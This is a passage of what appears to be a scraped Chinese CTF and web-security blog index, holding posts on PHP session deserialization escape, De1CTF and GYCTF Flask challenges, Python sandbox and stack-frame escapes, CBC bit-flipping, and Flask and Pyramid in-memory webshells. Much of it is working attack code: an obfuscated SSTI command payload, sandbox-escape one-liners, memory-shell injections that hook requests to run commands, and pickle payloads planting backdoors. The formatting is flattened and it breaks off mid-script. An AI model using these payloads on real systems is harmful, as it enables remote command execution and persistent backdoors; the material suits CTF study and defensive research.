phpphpphpflagphpphpphp;$_SESSION[function] = ;s:3:img;s:20:L2QwZzNfZmxsbGxsbGFn;s:1:a;s:1:a;;$_SESSION[img] = base64_encode(guest_img.png);echo serialize($_SESSION);? filter处理后:a:3:{s:4:”user”;s:22:””;s:8:”function”;s:56:”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;s:1:”a”;s:1:”a”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw”;} 于是function的值为img为L2QwZzNfZmxsbGxsbGFn,后面那一串就成功修改img值为flag的路径。 方法2：键名逃逸_SESSION[flagphp]=;s:1:1;s:3:img;s:20:L2QwZzNfZmxsbGxsbGFn; 过滤前 a:2:s:7:phpflag;s:48:;s:1:1;s:3:img;s:20:ZDBnM19mMWFnLnBocA==; 过滤后 a:2:s:7:;s:48:;s:1:1;s:3:img;s:20:ZDBnM19mMWFnLnBocA==; 下面的步骤和值替换一样 这里的键名变为;s:48: 实现了逃逸 payload:_SESSION[flagphp];s:1:”1”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;} [De1CTF 2019]SSRF Me进去贴脸源码,python代码审计。 #!/usr/bin/env python# encoding=utf-8from flask import Flask, requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(latin1)app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if not os.path.exists(self.sandbox): # SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = result[code] = 500 if self.checkSign(): if scan in self.action: tmpfile = open(./%s/result.txt % self.sandbox, w) resp = scan(self.param) if resp == Connection Timeout: result[data] = resp else: print (resp) tmpfile.write(resp) tmpfile.close() result[code] = 200 if read in self.action: f = open(./%s/result.txt % self.sandbox, r) result[code] = 200 result[data] = f.read() if result[code] == 500: result[data] = Action Error else: result[code] = 500 result[msg] = Sign Error return result def checkSign(self): return getSign(self.action, self.param) == self.sign# generate Sign For Action Scan.@app.route(/geneSign, methods=[GET, POST])def geneSign(): param = urllib.unquote(request.args.get(param, )) action = scan return getSign(action, param)@app.route(/De1ta, methods=[GET, POST])def challenge(): action = urllib.unquote(request.cookies.get(action)) param = urllib.unquote(request.args.get(param, )) sign = urllib.unquote(request.cookies.get(sign)) ip = request.remote_addr if waf(param): return No Hacker!!!! task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(/)def index(): return open(code.txt, r).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return Connection Timeoutdef getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check = param.strip().lower() if check.startswith(gopher) or check.startswith(file): return True return Falseif __name__ == __main__: app.debug = False app.run(host=0.0.0.0, port=80) 三个路由：/ 查看源代码/geneSign 生成签名/De1ta 关键路由 可以进行读取文件 解题思路(除了这个方法还可以使用hash拓展攻击) 密钥是不变的。而action定死为scan了 可变的只有中间的param 那么md5(密钥+flag.txtread+scan)等于md5(密钥+flag.txt+readscan) 这步的cookie请自己添加 [GYCTF2020]FlaskApp进去是base64解密和加密功能 看到flask先条件反射ssti 输入49得到编码 输入解码器得到回显 继续测试 e3tjb25maWd9fQ 得到回显 被HTML 实体转义 丢给ai恢复下就ok Config ENV: production, DEBUG: True, TESTING: False, PROPAGATE_EXCEPTIONS: None, PRESERVE_CONTEXT_ON_EXCEPTION: None, SECRET_KEY: s_e_c_r_e_t_k_e_y, PERMANENT_SESSION_LIFETIME: datetime.timedelta(days=31), USE_X_SENDFILE: False, SERVER_NAME: None, APPLICATION_ROOT: /, SESSION_COOKIE_NAME: session, SESSION_COOKIE_DOMAIN: False, SESSION_COOKIE_PATH: None, SESSION_COOKIE_HTTPONLY: True, SESSION_COOKIE_SECURE: False, SESSION_COOKIE_SAMESITE: None, SESSION_REFRESH_EACH_REQUEST: True, MAX_CONTENT_LENGTH: None, SEND_FILE_MAX_AGE_DEFAULT: datetime.timedelta(seconds=43200), TRAP_BAD_REQUEST_ERRORS: None, TRAP_HTTP_EXCEPTIONS: False, EXPLAIN_TEMPLATE_LOADING: False, PREFERRED_URL_SCHEME: http, JSON_AS_ASCII: True, JSON_SORT_KEYS: True, JSONIFY_PRETTYPRINT_REGULAR: False, JSONIFY_MIMETYPE: application/json, TEMPLATES_AUTO_RELOAD: None, MAX_COOKIE_SIZE: 4093, BOOTSTRAP_USE_MINIFIED: True, BOOTSTRAP_CDN_FORCE_SSL: False, BOOTSTRAP_QUERYSTRING_REVVING: True, BOOTSTRAP_SERVE_LOCAL: False, BOOTSTRAP_LOCAL_SUBDOMAIN: None 成功SSTI 正常打ssti就好 黑名单 [import,os,popen,eval,*,?] payload:((lipsum.__globals__.__builtins__['__i''mport__']('o''s'))['p''open'](\"\\x63\\x61\\x74\\x20\\x2f\\x2a\")).read() [0CTF 2016]piapiapia","tags":["CTF-wp"]},{"title":"python沙箱逃逸","path":"/2025/05/12/沙箱逃逸/","content":"前言Q1：什么是沙箱？沙箱是一种安全机制，在限制的环境中运行不受信任的代码。python中沙箱主要用于限制python，防止执行命令或者进行一些危险的行为。 Q2：什么是沙箱绕过？就是怎么绕过沙箱对我们的限制，拿到危险函数，最终来执行命令的过程。 目的对于python沙箱绕过，我们最终可能要实现的想法有如下: ·绕过限制 执行命令 ·写文件到指定位置 绕过方式import方式的绕过 import xxx from xxx import * __import__(xxx) 使用其他的方式来导入包名__import__(os).__dict__[system](whoami)#python2 and python3__import__(.decode.(base64)).getoutput(pwd)#python2import importlibx = importlib.import_module(pbzznaqf.encode(rot_13)) #commandsprint (x.getoutput(pwd))#python2 模块路径方式的绕过python中所有的包都是以.py文件形式存在的，使用所有的包都是由绝对路径，我们可以是使用路径来达到引入包的目的。 一般和系统相关的信息都在sys下，使用sys.path可以查看到各个包的路径。 import sysprint(sys.path)#sys下还有一个modules，返回一个字典，可以查看各个模块对应的系统路径。print(sys.modules[os])#python2 and python3 如果把sys、os、reload一系列模块禁止了，使用模块对应路径来导入模块 前提是必须知道绝对路径 一般是默认路径不会改变 execfile(/usr/lib/python.2.7/os.py)#python2 with open(/usr/lib/python3.6/os.py,r) as f: #路径通过上面的sys方法来找 exec(f.read())system(ls)#python2 and python3 timieitimport timeittimeit.timeit(__import__(os).system(dir),number=1)#p2 and p3 builtins函数 dir(__builtins__)[ArithmeticError, AssertionError, AttributeError, BaseException, BaseExceptionGroup, BlockingIOError, BrokenPipeError, BufferError, BytesWarning, ChildProcessError, ConnectionAbortedError, ConnectionError, ConnectionRefusedError, ConnectionResetError, DeprecationWarning, EOFError, Ellipsis, EncodingWarning, EnvironmentError, Exception, ExceptionGroup, False, FileExistsError, FileNotFoundError, FloatingPointError, FutureWarning, GeneratorExit, IOError, ImportError, ImportWarning, IndentationError, IndexError, InterruptedError, IsADirectoryError, KeyError, KeyboardInterrupt, LookupError, MemoryError, ModuleNotFoundError, NameError, None, NotADirectoryError, NotImplemented, NotImplementedError, OSError, OverflowError, PendingDeprecationWarning, PermissionError, ProcessLookupError, RecursionError, ReferenceError, ResourceWarning, RuntimeError, RuntimeWarning, StopAsyncIteration, StopIteration, SyntaxError, SyntaxWarning, SystemError, SystemExit, TabError, TimeoutError, True, TypeError, UnboundLocalError, UnicodeDecodeError, UnicodeEncodeError, UnicodeError, UnicodeTranslateError, UnicodeWarning, UserWarning, ValueError, Warning, WindowsError, ZeroDivisionError, __build_class__, __debug__, __doc__, __import__, __loader__, __name__, __package__, __spec__, abs, aiter, all, anext, any, ascii, bin, bool, breakpoint, bytearray, bytes, callable, chr, classmethod, compile, complex, copyright, credits, delattr, dict, dir, divmod, enumerate, eval, exec, exit, filter, float, format, frozenset, getattr, globals, hasattr, hash, help, hex, id, input, int, isinstance, issubclass, iter, len, license, list, locals, map, max, memoryview, min, next, object, oct, open, ord, pow, print, property, quit, range, repr, reversed, round, set, setattr, slice, sorted, staticmethod, str, sum, super, tuple, type, vars, zip] __builtins__.__dict__[X19pbXBvcnRfXw==.decode(base64)](b3M=.decode(base64)).system(whoami)#但是这个只能python2使用#==__builtins__.__dict__[__import__](os).system(whoami)#p2 and p3 exec and evaleval(__import__(os).system(dir))eval(__import__(os).system(cat flag)) platformimport platformprint (platform.popen(dir).read())#python2 dir 和 __dict__class A(): def __init__(self): self.a = aprint (dir(A))print (A.__dict__) import sysprint (dir(sys.modules[__name__])) func_codedef f(x,y,z): a = secret b = 2333print (f.func_code.co_argcount)print (f.func_code.co_consts)print (f.func_code.co_code)#p2def f(x,y,z): a = secret b = 2333print(f.__code__.co_argcount)print(f.__code__.co_consts)print(f.__code__.co_code)#p3 import disdef f(x,y,z): a = secret b = 2333print (dis.dis(f)) object类基础函数其实就是SSTI 这里不多写 花式处理字符串编码open(chr(102)+chr(108)+chr(97)+chr(103)).read() __builtins__.__dict__[__import__](os).system(whoami)#p2 and p __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,,","tags":["CTF学习"]},{"title":"栈帧逃逸","path":"/2025/05/11/初学栈帧逃逸/","content":"初学栈帧逃逸栈帧介绍在 Python 中，栈帧（Stack Frame） 是函数调用时在内存中分配的一个数据结构，用于存储函数的运行信息（如局部变量、参数、返回地址等）。它是 Python 解释器管理函数调用和执行流程的核心机制之一，尤其在递归、异常处理和调试时非常重要。 栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。 栈帧运作原理def foo(a, b): c = a + b bar(c)def bar(x): y = x * 2 print(y)foo(3, 4) 栈帧变化： 1.调用 foo(3, 4)：创建 foo 函数的栈帧，压入调用栈。foo 函数的局部变量表包含 a3, b4。 2.执行 c a + b：在 foo 的操作数栈上计算 a + b，将结果 7 存储在局部变量 c 中。 3.调用 bar(c)：创建 bar 函数的栈帧，压入调用栈。bar 函数的局部变量表包含 x7。 4.执行 y x * 2：在 bar 的操作数栈上计算 x * 2，将结果 14 存储在局部变量 y 中。 5.执行 print(y)：打印 y 的值 14。 6.bar 函数结束：从调用栈中弹出 bar 的栈帧，释放其内存。 7.foo 函数结束：从调用栈中弹出 foo 的栈帧，释放其内存。 栈帧属性方法介绍：f_locals: 一个字典，包含了函数或方法的局部变量。键是变量名。f_globals: 一个字典，包含了函数或方法所在模块的全局变量。f_code: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。f_lasti: 整数，表示最后执行的字节码指令的索引。f_back: 指向上一级调用栈帧的引用，用于构建调用栈。 生成器介绍生成器（Generator）是Python中一种特殊的迭代器，它可以在迭代过程中动态生成值，而不需要一次性将所有值存储在内存中。 其实生成器就是一种特殊的函数，一边运行一边生成值。 [普通函数] def get_list(): return [1, 2, 3]result = get_list() # 一次性返回整个列表 [1, 2, 3] [生成器] 这种特殊的函数每次只“产出”一个值（yield），运行完一个再接着运行下一个，而不是一下子把所有结果返回。优点不言而喻，节省内存空间。 生成器使用yield语句来产生值，每次调用生成器的next()方法时，生成器会执行直到遇到下一个yield语句为止，然后返回yield语句后面的值 def get_gen(): yield 1 yield 2 yield 3 gen = get_gen() # 不会立即执行，只是创建生成器对象print(next(gen)) # 输出 1print(next(gen)) # 输出 2print(next(gen)) # 输出 3 生成器属性gi_code: 生成器对应的code对象。gi_frame: 生成器对应的frame（栈帧）对象。gi_running: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。gi_yieldfrom：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。gi_frame.f_locals：一个字典，包含生成器当前帧的本地变量。 生成器表达式使用类似列表推导式的语法，但使用圆括号而不是方括号，可以用来创建生成器对象。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用（依然符合每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。 gen = (x * x for x in range(5))print(list(gen)) # 输出 [0, 1, 4, 9, 16] 和栈帧的结合接下来我给你看一个脚本 你就知道为什么我要介绍生成器这个东西了 def my_generator(): yield 1 yield 2 yield 3gen = my_generator()# 获取生成器的当前帧信息frame = gen.gi_frame# 输出生成器的当前帧信息print(Local Variables:, frame.f_locals)print(Global Variables:, frame.f_globals)print(Code Object:, frame.f_code)print(Instruction Pointer:, frame.f_lasti) 这个脚本并不难以理解，首先是定义一个生成器，然后我们调用生成器并且使用gi_frame获取了当前生成器栈帧，然后我们又访问栈帧对象的几个属性： f_locals是查看栈帧的存储的局部变量名，f_globals是查看全局变量名，f_code是查看函数或方法的字节码指令、常量、变量名等信息，f_lasti是查看最后执行的字节码指令的索引。 也许这些话语又变得很抽象，但是运行出来的结果将会很清晰的展示获取到的生成器的帧信息： Local Variables: Global Variables: __name__: __main__, __doc__: None, __package__: None, __loader__: _frozen_importlib_external.SourceFileLoader object at 0x0000024A3485C260, __spec__: None, __annotations__: , __builtins__: module builtins (built-in), __file__: D:\\\\pycharm\\\\PythonProject\\\\12121212.py, __cached__: None, my_generator: function my_generator at 0x0000024A346EA2A0, gen: generator object my_generator at 0x0000024A64CB1380, frame: frame at 0x0000024A347E4E00, file D:\\\\pycharm\\\\PythonProject\\\\12121212.py, line 1, code my_generatorCode Object: code object my_generator at 0x0000024A349F1200, file D:\\pycharm\\PythonProject\\12121212.py, line 1Instruction Pointer: 0 利用栈帧逃逸沙箱栈帧（stack frame）是函数调用时用来存储局部变量、返回地址等的一段内存空间。如果你能“逃逸”出这个栈帧的控制范围，你就能访问修改不该访问的内存（比如沙箱外的数据或指令），这就叫栈帧逃逸 原理是：是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals符号表，例如： frame0 (f 内部) – frame1 (waff 函数) – frame2 (exec 所在作用域) 下面脚本就是通过栈帧一步一步拿到全局变量s3cret但是不直接引用 s3cret=this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 print(frame) print(frame.f_back) print(frame.f_back.f_back) b = frame.f_back.f_back.f_globals[s3cret] #返回并获取前一级栈帧的globals return bb=waff()locals=code = compile(codes, test, exec)exec(code,locals)print(locals[b]) 过滤绕过list send 生成器表达式绕过 yield过滤也可以用生成器表达式进行绕过 globals中的__builtins__字段代码这么设计 key = this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = next(g) #获取到生成器的栈帧对象 b = frame.f_back.f_back.f_globals[key] #返回并获取前一级栈帧的globals return bb=waff()locals=__builtins__: Nonecode = compile(codes, , exec)exec(code, locals, None)print(locals[b]) 这里将沙箱中的__builtins__置为空，也就是说沙箱中不能调用内置方法了，那我们这段代码运行就会报错了(next方法不能使用)，那么该如何代替next方法来拿到生成器的值，还记得上面说可以遍历的形式来获取生成器的值： key = this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #生成器 frame = [i for i in g][0] #获取到生成器的栈帧对象 b = frame.f_back.f_back.f_back.f_globals[key] #返回并获取前一级栈帧的globals return bb=waff()locals=__builtins__: Nonecode = compile(codes, , exec)exec(code, locals, None)print(locals[b]) ​","tags":["CTF学习"]},{"title":"CBC字节翻转攻击","path":"/2025/04/27/CBC字节翻转攻击/","content":"CBC加密和解密过程 加密过程CBC加密流程： 准备 将明文按固定长度（通常是块大小，比如AES是128位）分块。 如果最后一块不足长度，需要填充（padding）。 选一个初始化向量（IV），它的长度跟分块大小相同。 加密每一块（第 i 块） 第1步：用当前明文块 PiP_iPi 和前一块密文（或IV）做异或（XOR）。 第一个块是$$C_0Ek(P0⊕IV)$$ 第2步：将异或后的结果送入加密算法（E_k）（比如AES）加密，得到当前块的密文 Ci。 第3步：当前的密文块 CiC_iCi 会作为下一块明文的XOR对象。 循环处理每一块，直到全部加密完成。 解密过程解密过程刚好相反，第一组密文在解密之后与初始向量IV异或得到第一组明文。第二组密文解密之后和第一组密文异或得到第二组明文。也就是说，解密一组明文需要本组和前一组的密文。 特点加密算法的输入是上一个密文分组和下一个明文分组的异或 EXB模式和CBC模式 CBC字节翻转攻击CBC字节翻转攻击的核心原理是通过破坏一个比特的密文来篡改一个比特的明文。 $$由题目得 A⊕BC$$如果我们想要改变输出的明文C 那我们只需要改变秘钥A 令改变后的A为A’ C为C’，于是： C=C⊕C⊕C =A⊕B⊕C⊕C =B⊕A⊕C⊕C令A=A⊕C⊕C--C=B⊕A--A⊕B=C 翻转成功啦！ 所以把A改为A’A⊕C⊕C’ 我们就可以实现这个字节翻转攻击 测试攻击模拟代码from Crypto.Cipher import AESimport uuidimport binasciiBS = AES.block_size # 分组长度key = btest # 密钥iv = uuid.uuid4().bytes # 随机初始向量pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() # Pkcs5Paddingdata = b1234567890abcdefabcdef1234567890 # 明文M# 加密def enc(data): aes = AES.new(pad(key), AES.MODE_CBC, iv) ciphertext = aes.encrypt(pad(data)) ciphertext = binascii.b2a_hex(ciphertext) return ciphertext# 解密def dec(c): c = binascii.a2b_hex(c) aes = AES.new(pad(key), AES.MODE_CBC, iv) data = aes.decrypt(c) return data# 测试CBC翻转def CBC_test(c): c = bytearray(binascii.a2b_hex(c)) c[0] = c[0] ^ ord(a) ^ ord(A) # c[0]为第一组的密文字符，a为第二组相应位置的明文字符，A是我们想要的明文字符 这一步就是在做 A=A⊕C⊕C c = binascii.b2a_hex(c) return cprint(ciphertext:, enc(data))print(data:, dec(enc(data)))print(CBC Attack:, dec(CBC_test(enc(data)))) 输出结果 ciphertext: b65518dfe77f7d677134f341c5b00c1674e7a87b231f852b63d35ee69dc60bcc7c5b7325b590c00d089b6ad312f21b043data: b1234567890abcdefabcdef1234567890\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10CBC Attack: b\\xfe\\xb4\\x11n+\\x1a\\xb7\\x90\\x9c\\x86TPvS\\xd4\\x9cAbcdef1234567890\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10 可以看到第二组密文解密之后已经被我们更改成了A，而由于我们更改了第一组的密文，所以第一组解密的明文变成了乱码。如果我们想要更改第一组的明文，则需要修改初始向量IV的值。 于是达到修改明文的内容的目的：解密出来的内容就会把 a 改成 A 例题bugku-login4题解链接：https://cltheorem.github.io/2019/03/bugku-login/ 总结通过CBC字节翻转攻击，假如我们能够触发加解密过程，并且能够获得每次加密后的密文。那么我们就能够在不知道key的情况下，通过修改密文或IV，来控制输出明文为自己想要的内容，而且只能从最后一组开始修改，并且每改完一组，都需要重新获取一次解密后的数据，要根据解密后的数据来修改前一组密文的值。 参考文章https://blog.csdn.net/XL115715453/article/details/102442024?spm=1001.2014.3001.5506 https://goodapple.top/archives/217 https://blog.csdn.net/XiongSiqi_blog/article/details/131925246","tags":["CTF学习"]},{"title":"浅谈python内存马","path":"/2025/04/20/python内存马学习/","content":"前言：想法来源于TGCTF的一道题 想具体学习下 内存马究竟是什么东西 Python内存马众所周知，python下有许多轻型框架，比如 flask Tornado pyramid等 每个框架都基本有其对应的内存马注入的方式 Flask内存马注入flask框架中使用 render_template_string() 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 python 内存马的注入。 老版flask内存马注入多存在ssti的场景中 如果想要在python中实现内存马 必须想是否能动态注册新路由 flask注册新路由用的是 app.route 实际调用的是add_url_ruel 注意：从下面一直到构造webshell 都是前言知识 为了让你更好理解 内存马的payloadadd_url_ruel介绍app.add_url_rule(/index/,endpoint=index,view_func=index) 三个参数： url:必须以开头 endpoint：(站点) view_func：方法 只需要写方法名也可以为匿名参数），如果使用方法名不要加括号，加括号表示将函数的返回值传给了view_func参数了，程序就会直接报错。 原理首先是要添加路由成功，然后特别重要的是 view_func中采用匿名函数的方式。该函数要实现捕获值，命令执行，响应。 当一个网页请求后，会实例化一个Request Context。在python中分出了两种上下文，请求上下文(request context)和应用上下文(session context)。一个请求上下文中封装了请求的信息。而上下文的结构是运用了一个Stack的栈结构，也就是说它拥有一个栈所拥有的全部特性。request context实例化后，它会被push到栈_request_ctx_stack中，那我们可以通过获取栈顶元素的方法来获取当前的请求。 Request=_request_ctx_stac.top lambada表达式链接:https://www.runoob.com/python3/python-lambda.html Flask上下文管理机制在使用 Flask 框架实现功能接口的时候，前端点击按钮发送请求的请求方式和 form 表单提交给后端的数据，后端都是通过 Flask 中的 request 对象来获取的。在 Flask 框架中，这种传递数据的方式被称为上下文管理，在 Flask 框架中有四个上下文管理对象：request ,session,current_app 和 g 变量。其中request 和 session 被称为请求上下文,current_app 和 g 变量被称为应用上下文。 其实一句话理解就是：Flask 的上下文机制是为了解决“请求中相关的数据需要在多个函数中使用，但又不想手动层层传参”的问题。 请求上下文 (request context)Flask上下文对象相当于一个容器。保存了Flask程序运行过程的一些信息，比如请求方式和表单数据。 1.request 在 Flask 中，request 对象封装了 HTTP 请求的内容，针对的是 HTTP 请求，保存了当前请求的相关数据。 2.session session和cookie都是用来做状态保持 但是cookie依赖于浏览器，但是session不需要。 应用上下文 (application context)应用上下文不是一直存在的，他是临时的，发送请求才会有应用上下文，请求结束后就会失效。 1.curent_app current_app 是应用程序上下文，用于存储 Flask 应用程序 app 中的变量，可以在 current_app 中存储一些变量。 2.g变量 g 是 AppContext 中的临时全局变量，每个请求独立，适合用于存储数据库连接、缓存等中间件资源。会随着请求的结束而销毁。 核心两个栈 类型 名称 存什么 请求上下文栈 _request_ctx_stack 包含 request, session, g 等 应用上下文栈 _app_ctx_stack 包含 current_app, g eval用法eval(expression, globalsNone, localsNone)expression(必需):python表达式 执行并访问执行的结果 globals(可选):这是一个字典，它提供了执行表达式时可用的全局变量。如果没有提供，eval() 默认使用调用时的全局作用域（即当前环境中的全局变量） locals(可选):这是一个字典，表示执行表达式时可用的局部变量。如果没有提供，eval() 默认使用当前作用域中的局部变量。 内存马写法url_for.__globals__[__builtins__][eval](\tapp.add_url_rule( /shell, shell, lambda :__import__(os).popen(_request_ctx_stack.top.request.args.get(cmd, whoami)).read()\t), _request_ctx_stack:url_for.__globals__[_request_ctx_stack], app:url_for.__globals__[current_app] url_for[__globals__][__builtins__][eval](__import__(sys).modules[__main__].__dict__[app].before_request_funcs.setdefault(None,[]).append(lambda :__import__(os).popen(cat /flag).read())) (1)url_for.__globals__[__builtins__] Python 中内置的全局函数和对象，包括 print()、eval() 等。通过这一步，你可以访问内置的 eval() 函数 (2)( app.add_url_rule( /shell, shell, lambda :__import__(os).popen(_request_ctx_stack.top.request.args.get(cmd, whoami)).read() ) 创建一个新路由 shell 在这个shell 获取请求中的cmd参数 如果没有提供cmd参数 就默认执行whoami命令 (3) _request_ctx_stack:url_for.__globals__[_request_ctx_stack], app:url_for.__globals__[current_app] 这是eval的函数第二个参数 其实就是字典 允许在执行表达式时使用 Flask 特有的变量和对象 Flask 的上下文管理使用了栈结构，通过将 _request_ctx_stack 和 app 放到上下文字典中，eval() 就可以访问到当前的请求上下文和应用对象，进而执行动态生成的代码。这使得攻击者可以利用这种机制执行恶意的操作（比如执行传入的命令）。 新版flask内存马注入新版已经不支持通过add_url_rule添加路由了，所以要考虑用其他的方法来代替add_url_rule 使用@app.before_request和 @app.before_request在response(响应)之前做响应 from flask import Flaskfrom flask import requestfrom flask import redirectfrom flask import session app = Flask(__name__) # type:Flaskapp.secret_key = DragonFire @app.before_requestdef is_login(): if request.path == /login: return None if not session.get(user): return redirect(/login) @app.route(/login)def login(): return Login @app.route(/index)def index(): return Index @app.route(/home)def home(): return Login app.run(0.0.0.0, 5000) 查看这个定义 发现 self.before_request_funcs.setdefault(None, []).append(f) 意思：将函数 f 注册为全局的 before_request 钩子，在每次请求处理前自动调用。 [钩子函数是一种“插入点”，让你在程序的某些关键时刻执行自定义逻辑] 意思就是我们可以传入一个lambada函数来执行命令！lambda :__import__(os).popen(whoami).read() 构造poc:eval(__import__(sys).modules[__main__].__dict__[app].before_request_funcs.setdefault(None,[]).append(lambda :__import__(os).popen(dir).read())) ！！！！这样在每次response之前都会执行lambada函数来执行命令~~~ 尝试本地起服务 from flask import Flask, request, Responseapp = Flask(__name__)@app.route(/)def index(): return Home Page@app.route(/e)def inject_memory_shell(): cmd = request.args.get(cmd) try: # 使用 eval 动态注入代码 eval(cmd) return Payload injected successfully except Exception as e: return fError: e@app.before_requestdef trigger_hook(): pass # 所有注入的 before_request 都会自动执行if __name__ == __main__: app.run(debug=True) 随意访问一个目录 得到 执行命令成功啦！喜！ @app.after_request在response(响应)之后做出响应 @app.after_requestdef foot_log(environ): if request.path != /login: print(有客人访问了,request.path) return environ 这里也是和前面的差不多 但是要定义一个返回值 不然会报错 eval(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(cmd) and exec(\\global CmdResp;CmdResp=__import__(\\flask\\).make_response(__import__(\\os\\).popen(request.args.get(\\cmd\\)).read())\\)==None else resp)) from flask import Flask, request, make_responseapp = Flask(__name__)# 注入点：可动态注入 payload@app.route(/e)def inject_memory_shell(): cmd = request.args.get(cmd) try: eval(cmd) return Payload injected successfully except Exception as e: return fError: e# 初始钩子：占位@app.after_requestdef default_after(resp): return resp# 主页面@app.route(/)def index(): return Home Pageif __name__ == __main__: app.run(debug=True) bingo!成功 pickle下利用的poc import osimport pickleimport base64class A(): def __reduce__(self): return (eval,(__import__(\\sys\\).modules[__main__].__dict__[app].before_request_funcs.setdefault(None, []).append(lambda :__import__(os).popen(request.args.get(gxngxngxn)).read()),))a = A()b = pickle.dumps(a)print(base64.b64encode(b)) import osimport pickleimport base64class A(): def __reduce__(self): return (eval,(__import__(sys).modules[__main__].__dict__[app].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(gxngxngxn) and exec(\\global CmdResp;CmdResp=__import__(\\flask\\).make_response(__import__(\\os\\).popen(request.args.get(\\gxngxngxn\\)).read())\\)==None else resp),))a = A()b = pickle.dumps(a)print(base64.b64encode(b)) import osimport pickleimport base64class A(): def __reduce__(self): return (exec,(global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(os).popen(request.args.get(gxngxngxn)).read(),))a = A()b = pickle.dumps(a)print(base64.b64encode(b)) 参考文章https://xz.aliyun.com/news/13858https://www.cnblogs.com/gxngxngxn/p/18181936https://research.qianxin.com/archives/2329https://blog.csdn.net/solitudi/article/details/115331388 Pyamid内存马例题详见 TGCTF20245 熟悉的配方* 或者 强网杯决赛Pyramid 利用栈帧打Pyramid WEB框架下的内存马栈帧不懂得详情看:https://blog.csdn.net/Jesse_Kyrie/article/details/139789665 栈帧（Stack Frame）是 Python 虚拟机 中程序执行的载体之一，也是 Python 中的一种执行上下文。 每当 Python 执行一个函数或方法时，都会创建一个栈帧来表示当前的函数调用，并将其压入一个称为 调用栈 （Call Stack）的数据结构中。 调用栈是一个后进先出（LIFO）的数据结构，用于管理程序中的函数调用关系。 栈帧的创建和销毁是动态的，随着函数的调用和返回而不断发生 构造内存马Pyramid WEB新框架下的内存马发现是通过pyramid.config来生成的，因为pyramid.config里有add_view add_route，可以用来注册路由。 所以我们要那到这个config，所以得获取到栈帧的globals全局才能拿到当前的app config。 先看下面这段代码，这个就是为了获取config那个栈帧 def f(): yield g.gi_frame.f_backg = f() frame = next(g) b = frame.f_back.f_back.f_globalsprint(b) 然后拿到这个栈帧过后 就访问config添加新路由了 下面定义了一个新hello函数 def hello(request): code = request.POST[code] res=eval(code) return Response(res) config.add_route(shell, /shell) #添加新路由 config.add_view(hello, route_name=shell) #给/shell路由绑定视图hello config.commit() #立即更新服务 而不是手动重启 这样才能够生效 整合一下payload就是 def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals def hello(request): code = request.POST[code] res=eval(code) return Response(res) config.add_route(shell, /shell) config.add_view(hello, route_name=shellb) config.commit() waff() TGCTF2025 熟悉* payload写法 import requestsfrom urllib.parse import quotecode=def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals def hello(request): code = request.params[code] res=eval(code) return Response(res) config.add_route(shellb, /shellb) config.add_view(hello, route_name=shellb) config.commit() waff()url=YOUR_URLdata=expr:fcode+111res=requests.post(url=url,data=data)print(res.text) 强网杯pyramid脚本 import requestsfrom urllib.parse import quotecode=def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals print(b)waff()code1=print(1)burp0_url = 